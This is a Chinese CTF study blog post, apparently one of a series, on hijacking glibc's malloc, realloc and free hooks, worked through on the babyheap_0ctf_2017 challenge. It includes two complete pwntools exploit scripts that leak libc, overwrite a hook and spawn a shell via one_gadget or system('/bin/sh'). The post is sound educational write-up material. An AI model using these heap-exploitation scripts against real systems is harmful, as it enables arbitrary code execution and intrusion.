---
title:  劫持hook函数——学pwn小记(6)
categories: [CTF]
tags: [pwn]

---
在glibc中，通过指定hook函数，可以修改`malloc()`、`readloc()`、`free()`等函数的行为，从而帮助我们调试使用动态分配内存的程序。我们可以利用这一个特性通过篡改hook的值，使程序在调用动态分配内存相关函数前改变程序流，执行我们想执行的代码。
<!-- more -->
## __malloc_hook

`__malloc_hook` 是一个弱类型的函数指针，指向 `void *function（size_t size ,void *caller ）`,在调用`malloc()`函数是会判断`__malloc_hook`的值是否为空，不为空则调用它.因此我们可以利用恶意漏洞来覆盖`__malloc_hook` 的值.

在之前[fastbin二次释放——学pwn小记(5)](https://lexsd6.github.io/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF)中,解例题`babyheap_0ctf_2017`时用的就是`__malloc_hook`来调用one_gadget.具体exp可以看前面链接中的文章这里不多说.

![image-20210315165005926](image-20210315165005926.png)

## __realloc_hook

`__realloc_hook`与`__malloc_hook` 相似是一个弱类型的指针.在调用`realloc()`函数是会判断`__realloc_hook`的值是否为空,不为空则执行其执行的代码.这是`__realloc_hook`的一种用法。

同时，我们也可以用`__malloc_hook`来指向`_libc_realloc()`函数内部(即强行调用`realloc()`)然后通过`__realloc_hook`来触发one_gadget.

下面还是以babyheap_0ctf_2017仔细来说下。

`__realloc_hook`只在`__malloc_hook`的前8个字节（64位程序）所以很容易覆盖掉。

![image-20210315194932627](image-20210315194932627.png)

因此我们只需将`__malloc_hook`的值改成__libc_realloc中某一个gatget的值。

将`__malloc_hook`前的8个字节,即`__realloc_hook`改成one_gatget的值。

同时因为`__libc_realloc`有大量push与pop的gatget，我们可以同过它来寻找调节寄存器和堆栈使它能满足one_gatget的条件。

![image-20210315203233831](image-20210315203233831.png)

![image-20210315203332512](image-20210315203332512.png)

exp如下：

```python
from pwn import *

e=ELF('./babyheap')
p=process('./babyheap')
#p=remote('node3.buuoj.cn',26886)
#process('./babyheap')


def alloc(size):
	p.sendline('1')
	p.sendline(str(size))

def fill(num,text):
	p.sendline('2')
	p.sendline(str(num))
	p.sendline(str(len(text)))
	p.sendline(str(text))

def free(num):
	p.sendline('3')
	p.sendline(str(num))

def dump(num):
	
	p.sendline('4')
	p.sendline(str(num))
	x=p.recvuntil('Content: \n')
	
	return p.recv()




def fast():
       
	alloc(0x10) #0
	alloc(0x10) #1
	alloc(0x10) #2
	alloc(0x10) #3
	alloc(0x80) #4
        
	free(1)
	free(2)
	
	pay=0x10*'a'
	pay+=p64(0)+p64(0x21)
	pay+=p64(0x88)+p64(0x88)
        pay+=p64(0)+p64(0x21) 
        pay+=p8(0x80)
	fill('0',pay)
	
	pay='a'*0x10
	pay+=p64(0)+p64(0x21)
	fill('3',pay)

	alloc(0x10) #1
	alloc(0x10) #2
	fill(1,'aaaa')
	fill(2,'bbbb')
	#free(1)
	#free(2)

	#gdb.attach(p)

def leak():
	global base,malloc_hook
	pay=p64(0)*3+p64(0x91)
	fill('3',pay)
	alloc(0x80) #5
	free(4)
	
	addr=u64(dump(2)[:8])
	print(addr)
	base=addr-0x3c4b78
	malloc_hook=base+0x3c4b10
	log.info("libc_base: "+hex(base))
	log.info("malloc_hook:"+hex(malloc_hook))	
 	
def pwn():
	alloc(0x60) #4
	free(4)
	fill('2',p64(malloc_hook-0x30+0xd))
	#gdb.attach(p)
	alloc(0x60)#4
	
	alloc(0x60) #fake
	one=base+0xf1207
	realloc_hook=0x84710+base
	fill('6',p8(0)*3+p64(0)+p64(one)+p64(realloc_hook))
	#gdb.attach(p)
	alloc(0x60)

fast()
leak()
pwn()
p.interactive()
```



## __free_hook

`__free_hook`的利用有所不同，应为附近一大片都没有可以利用的字节。但是如果可以攻击main_arena,篡改top到`__free_hook`之前，可以通过分配chunk来覆盖劫持`__free_hook`。以babyheap_0ctf_2017题目来分析：

同过gdb，我们可以看到，`main_arena`与`__malloc_hook`是非常接近的。

![image-20210315205920462](image-20210315205920462.png)

接着就是top地址的问题。top地址指向的是top chunk 的地址。

![image-20210315211731514](image-20210315211731514.png)

我们可以看到现在top chunk 大小为0x20e61。

![image-20210315211541654](image-20210315211541654.png)

而通过在遍历`__free_hook`附近大于0x20e61的字节就只有`__free_hook-0xb58`处

![image-20210315212414978](image-20210315212414978.png)

所以我们覆盖top地址到`__free_hook-0xb58`处，然后创造chunk使最后一个能覆盖到free_hook,并将free_hook写入system的值.再在一个chunk里写入`bin/sh`，再free ta。

![image-20210315213511550](image-20210315213511550.png)



![image-20210315213300949](image-20210315213300949.png)

exp如下：

```python
from pwn import *

e=ELF('./babyheap')
p=process('./babyheap')
#p=remote('node3.buuoj.cn',26886)
#process('./babyheap')


def alloc(size):
	p.sendline('1')
	p.sendline(str(size))

def fill(num,text):
	p.sendline('2')
	p.sendline(str(num))
	p.sendline(str(len(text)))
	p.sendline(str(text))

def free(num):
	p.sendline('3')
	p.sendline(str(num))

def dump(num):
	
	p.sendline('4')
	p.sendline(str(num))
	x=p.recvuntil('Content: \n')
	
	return p.recv()




def fast():
       
	alloc(0x10) #0
	alloc(0x10) #1
	alloc(0x10) #2
	alloc(0x10) #3
	alloc(0x80) #4
        
	free(1)
	free(2)
	
	pay=0x10*'a'
	pay+=p64(0)+p64(0x21)
	pay+=p64(0x88)+p64(0x88)
        pay+=p64(0)+p64(0x21) 
        pay+=p8(0x80)
	fill('0',pay)
	
	pay='a'*0x10
	pay+=p64(0)+p64(0x21)
	fill('3',pay)

	alloc(0x10) #1
	alloc(0x10) #2
	fill(1,'aaaa')
	fill(2,'bbbb')
	#free(1)
	#free(2)

	#gdb.attach(p)

def leak():
	global base,malloc_hook
	pay=p64(0)*3+p64(0x91)
	fill('3',pay)
	alloc(0x80) #5
	free(4)
	
	addr=u64(dump(2)[:8])
	print(addr)
	base=addr-0x3c4b78
	malloc_hook=base+0x3c4b10
	log.info("libc_base: "+hex(base))
	log.info("malloc_hook:"+hex(malloc_hook))	
 	
def pwn():
	system=base+0x453a0
	free_hook=base+0x3c67a8
	log.info("system: "+hex(system))
	log.info("free_hook:"+hex(free_hook))
	alloc(0x60) #4
	free(4)
	fill('2',p64(malloc_hook-0x30+0xd))
	gdb.attach(p)
	alloc(0x60)#4
	
	alloc(0x60) #fake 6
	one=base+0xf1207
	fill('6',p8(0)*3+p64(0)*15+p64(free_hook-0xb58))
	
	alloc(0xb30)#7
	fill('7','/bin/sh')
	alloc(0x60)#8
	fill('8',p64(0)+p64(system))
	#gdb.attach(p)
	free(7)
fast()
leak()
pwn()
p.interactive()
```



## 后记

这算是弥补了，上篇文章的遗憾吧。了解另一种通过`__realloc_hook`利用one_gatget方式。更重要的是利用`__free_hook`来写shell来调用。



## 参考文献

https://blog.csdn.net/hoi0714/article/details/7909488

https://bbs.pediy.com/thread-246786.htm#msg_header_h2_3